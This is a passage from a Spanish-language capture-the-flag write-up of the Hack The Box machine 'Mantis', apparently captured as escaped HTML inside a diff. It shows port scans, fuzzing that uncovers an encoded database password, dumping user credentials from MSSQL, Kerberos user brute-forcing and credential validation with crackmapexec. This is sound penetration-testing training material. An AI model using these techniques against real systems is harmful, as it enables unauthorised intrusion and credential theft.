-8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-open-proxy: Proxy might be redirecting requests                                                                           
-|_http-server-header: Microsoft-IIS/7.5                     
-|_http-title: Tossed Salad - Blog                                                                                                
-9389/tcp  open  mc-nmf       .NET Message Framing               
-47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-49152/tcp open  msrpc        Microsoft Windows RPC
-49153/tcp open  msrpc        Microsoft Windows RPC
-49154/tcp open  msrpc        Microsoft Windows RPC
-49155/tcp open  msrpc        Microsoft Windows RPC
-49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0 
-49158/tcp open  msrpc        Microsoft Windows RPC
-49164/tcp open  msrpc        Microsoft Windows RPC
-49166/tcp open  msrpc        Microsoft Windows RPC
-49168/tcp open  msrpc        Microsoft Windows RPC
-50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
-| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SSL_Self_Signed_Fallback
-| Not valid before: 2021-09-20T00:22:20
-|_Not valid after:  2051-09-20T00:22:20
-|_ssl-date: 2021-09-20T00:28:41+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +4m46s from scanner time. 
-| ms-sql-ntlm-info: 
-|   Target_Name: HTB
-|   NetBIOS_Domain_Name: HTB
-|   NetBIOS_Computer_Name: MANTIS
-|   DNS_Domain_Name: htb.local
-|   DNS_Computer_Name: mantis.htb.local
-|_  Product_Version: 6.1.7601
-Service Info: Host: MANTIS&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode: 
-|   2.1: 
-|_    Message signing enabled and required
-| smb-os-discovery: 
-|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows Server 2008 R2 Standard 6.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
-|   Computer name: mantis
-|   NetBIOS computer name: MANTIS&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
-|   Domain name: htb.local
-|   Forest name: htb.local
-|   FQDN: mantis.htb.local
-|_  System &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-09-19T20:28:30-04:00
-|_clock-skew: mean: 39m03s, deviation: 1h30m43s, median: 4m45s
-| smb-security-mode: 
-|   account_used: &amp;lt;blank&amp;gt;
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: required
-| ms-sql-info: 
-|   10.10.10.52:1433: 
-|     Version: 
-|       name: Microsoft SQL Server 2014 RTM
-|       number: 12.00.2000.00
-|       Product: Microsoft SQL Server 2014
-|       Service pack level: RTM
-|       Post-SP patches applied: &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
-|_    TCP port: 1433
-| smb2-time: 
-|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2021-09-20T00:28:34
-|_  start_date: 2021-09-20T00:21:54
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;82.40 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos diversos puertos abiertos por los cuales podemos obtener una forma de acceder a la máquina, así que vamos en orden.&lt;/p&gt;
-
-&lt;h3 id=&quot;smb&quot;&gt;SMB&lt;/h3&gt;
-&lt;p&gt;Podíamos probar una &lt;em&gt;null session&lt;/em&gt; para el servicio smb:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.52 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
-Anonymous login successful
-
-        Sharename       Type      Comment
-        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
-SMB1 disabled &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; no workgroup available
-❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.52
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.52:445 Name: 10.10.10.52                                       
-❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.52 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;null&quot;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Authentication error on 10.10.10.52
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Podemos acceder al servicio SMB con una &lt;em&gt;null session&lt;/em&gt;; sin embargo, no se lista algún recurso, por lo que igual podriamos esperar para obtener credenciales válidas de acceso y tratar de listar los recursos del servicio.&lt;/p&gt;
-
-&lt;h3 id=&quot;web&quot;&gt;Web&lt;/h3&gt;
-
-&lt;p&gt;Vamos a tratar de ver el contenido de los sitios web alojados en la máquina, que de acuerdo con el archivo &lt;strong&gt;targeted&lt;/strong&gt; vemos el puerto 1337 asociado a &lt;em&gt;Microsoft IIS 7.5&lt;/em&gt;. Aquí podriamos pensar que ejecutando el exploit de &lt;em&gt;MS17-010&lt;/em&gt; podemos acceder al equipo; sin embargo, al parecer se encuentra parcheado.  También vemos el puerto 8080 relacionado con el blog &lt;em&gt;Tossed Salad - Blog&lt;/em&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-mantis/mantis_web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; podemos obtener un poco de información adicional; como el uso del CMS Orchard, que de acuerdo con lo investigado, poco podemos hacer.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.52:8080/
-http://10.10.10.52:8080/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] ASP_NET[4.0.30319][MVC5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.52], MetaGenerator[Orchard], Microsoft-IIS[7.5], Script[text/javascript], Title[Tossed Salad - Blog], UncommonHeaders[x-generator,x-aspnetmvc-version], X-Powered-By[ASP.NET]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Podemos tratar se hacer un &lt;em&gt;fuzzing&lt;/em&gt; empezando el puerto 1337, pero antes creamos un direccionario a partir del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;directory-list-2.3-medium.txt&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;user|pass|cred|note|secur&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; dictionary.txt
-❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; dictionary.txt http://10.10.10.52:1337/FUZZ
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://10.10.10.52:1337/FUZZ
-Total requests: 1637
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                         
-=====================================================================
-
-000000802:   301        1 L      10 W       160 Ch      &quot;secure_notes&quot;                                                  
-
-Total time: 0
-Processed Requests: 1637
-Filtered Requests: 1636
-Requests/sec.: 0
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos el recurso &lt;em&gt;secure_notes&lt;/em&gt; que al acceder vemos dos archivos. El primero, un archivo txt que tiene un nombre un poco extraño después del &lt;em&gt;dev_notes_&lt;/em&gt; y de acuerdo con el formato, podría trate de  una cadena en base64.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-mantis/mantis_fuzz.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
-&lt;/span&gt;6d2424716c5f53405f504073735730726421
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;El resultado nos va una cadena en hexadecimal, por lo que la pasamos a un formato legible para nosotros:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;| xxd &lt;span class=&quot;nt&quot;&gt;-ps&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
-&lt;/span&gt;m&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;ql_S@_P@ssW0rd!
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos una posible contraseña asociada al servicio de SQL (no olvidemos guardar siempre las posibles credenciales que identifiquemos). Ahora, checando el contenido del archivo txt, tenemos lo siguiente:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-mantis/mantis_sql.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Tenemos varias pistas:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;CMS Orchard&lt;/li&gt;
-  &lt;li&gt;Usuario del SQL server &lt;strong&gt;admin&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;Base de datos &lt;strong&gt;orcharddb&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Ya tenemos credenciales potenciales a probar en el servicio de SQL.&lt;/p&gt;
-
-&lt;h3 id=&quot;microsoft-sql-server&quot;&gt;Microsoft SQL Server&lt;/h3&gt;
-
-&lt;p&gt;A través del puerto 1433 vemos que corre el servicio &lt;em&gt;Microsoft SQL Server&lt;/em&gt;. Podriamos intentar acceder a dicho recurso como el usuario &lt;strong&gt;sa&lt;/strong&gt; (usuario común):&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ sqsh &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'sa'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 10.10.10.52
-sqsh-2.5.16.1 Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1995-2001 Scott C. Gray
-Portions Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2004-2014 Michael Peppler and Martin Wesdorp
-This is free software with ABSOLUTELY NO WARRANTY
-For more information &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\warranty'&lt;/span&gt;
-Password: 
-Login failed &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'sa'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Password: 
-Login failed &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'sa'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Password: 
-Login failed &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'sa'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Password: ^C
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No nos permite acceder al servidor como el usuario &lt;strong&gt;sa&lt;/strong&gt; y sin contraseña o probando contraseñas default. Recordando que tenemos potenciales credenciales, las probamos:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ sqsh &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 10.10.10.52
-sqsh-2.5.16.1 Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1995-2001 Scott C. Gray
-Portions Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2004-2014 Michael Peppler and Martin Wesdorp
-This is free software with ABSOLUTELY NO WARRANTY
-For more information &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\warranty'&lt;/span&gt;
-Password: 
-1&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Estamos dentro del SQL Server. Primeramente, vamos a listar las tablas alojadas en la base de datos que identificamos &lt;em&gt;orcharddb&lt;/em&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt; SELECT TABLE_NAME from orcharddb.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'BASE TABLE'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-2&amp;gt; go &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; csv &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; output.csv
-1&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;go -m csv &amp;gt; output.csv&lt;/code&gt; nos exportamos la información a nuestro directorio de trabajo, esto es para tener la información de una forma más cómoda ya que el sin esto, la manera en como presenta el servidor la información es muy fea. En dicho archivo, vemos dos tablas que tienen la palabra &lt;strong&gt;user&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;output.csv | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;user&quot;&lt;/span&gt;
-&lt;span class=&quot;s2&quot;&gt;&quot;blog_Orchard_Users_UserPartRecord&quot;&lt;/span&gt;
-&lt;span class=&quot;s2&quot;&gt;&quot;blog_Orchard_Roles_UserRolesPartRecord&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A este punto, vamos a listar el contenido de la tabla &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blog_Orchard_Users_UserPartRecord&lt;/code&gt;. (Nota: Para visualizar la información en un formato decente, vamos a exportar la información en formato html y la veremos en nuestro navegador en la dirección &lt;em&gt;localhost&lt;/em&gt;):&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt; USE orcharddb&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-2&amp;gt; SELECT &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; FROM blog_Orchard_Users_UserPartRecord&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-3&amp;gt; go &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; html &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; index.html
-1&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;index.html /var/www/html/.
-❯ service apache2 start
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-mantis/mantis_db.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como se puede observar en los resultados obtenidos, tenemos el usuario &lt;strong&gt;admin&lt;/strong&gt; y el usuario &lt;strong&gt;james&lt;/strong&gt;, quien tiene una contraseña en texto claro; asi que nos guardamos las credenciales.&lt;/p&gt;
-
-&lt;h3 id=&quot;kerberos&quot;&gt;Kerberos&lt;/h3&gt;
-
-&lt;p&gt;Se tiene el puerto 88 abierto asociado al servicio de kerberos, por lo que podríamos conectarnos a través de una &lt;em&gt;null session&lt;/em&gt; y ver posibles usuarios del dominio.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; 10.10.10.52
-Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;s password: 
-Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tampoco podemos ver la información relacionada al dominio.&lt;/p&gt;
-
-&lt;h3 id=&quot;fuerza-bruta-forma-de-obtener-usuarios-del-dominio&quot;&gt;Fuerza bruta (forma de obtener usuarios del dominio)&lt;/h3&gt;
-
-&lt;p&gt;A este punto vemos que no tenemos forma de hacerlo; pero NO, vamos a tratar de acceder un tipo de ataque de fuerza bruta para obtener usuarios del dominio, para ello necesitamos de &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;SecList&lt;/a&gt;; lo descargamos en nuestra máquina y haciendo uso del script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;krb5-user-enum&lt;/code&gt; en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; y del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;names.txt&lt;/code&gt; de &lt;em&gt;SecList&lt;/em&gt;, procedemos a ejecutar el siguiente comando:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p88&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;krb5-enum-users &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;krb5-enum-users.realm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'htb.local'&lt;/span&gt;,userdb&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/opt/SecLists-master/Usernames/Names/names.txt 10.10.10.52 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; kerberosUserEnum
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-19 20:40 CDT
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.52
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT   STATE SERVICE
-88/tcp open  kerberos-sec
-| krb5-enum-users: 
-| Discovered Kerberos principals
-|_    james@htb.local
-
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;242.63 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos un usuario potencial del dominio: &lt;strong&gt;james&lt;/strong&gt; que de acuerdo con la base de datos, es el mismo y tenemos la contraseña.&lt;/p&gt;
-
-&lt;p&gt;A partir de aquí, tenemos un juego de credenciales a probar; así que primero vamos a validarlas con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crackmapexec&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.52 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'m$$ql_S@_P@ssW0rd!'&lt;/span&gt;
-SMB         10.10.10.52     445    MANTIS           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MANTIS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:htb.local&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.52     445    MANTIS           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] htb.local&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dmin:m&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;ql_S@_P@ssW0rd! STATUS_LOGON_FAILURE 
-❯ crackmapexec smb 10.10.10.52 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'james'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'J@m3s_P@ssW0rd!'&lt;/span&gt;
-SMB         10.10.10.52     445    MANTIS           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MANTIS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:htb.local&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.52     445    MANTIS           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] htb.local&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;ames:J@m3s_P@ssW0rd!
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos un &lt;strong&gt;[+]&lt;/strong&gt; para el usuario &lt;strong&gt;james&lt;/strong&gt;. Asi que vamos a tratar de listar los recursos del servicio SMB con dichas credenciales:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.52 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'james%J@m3s_P@ssW0rd!'&lt;/span&gt;
-
-        Sharename       Type      Comment
-        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
-        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;         Disk      Remote Admin
-        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;             Disk      Default share
-        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;           IPC       Remote IPC
-        NETLOGON        Disk      Logon server share 
-        SYSVOL          Disk      Logon server share 
-SMB1 disabled &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; no workgroup available
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
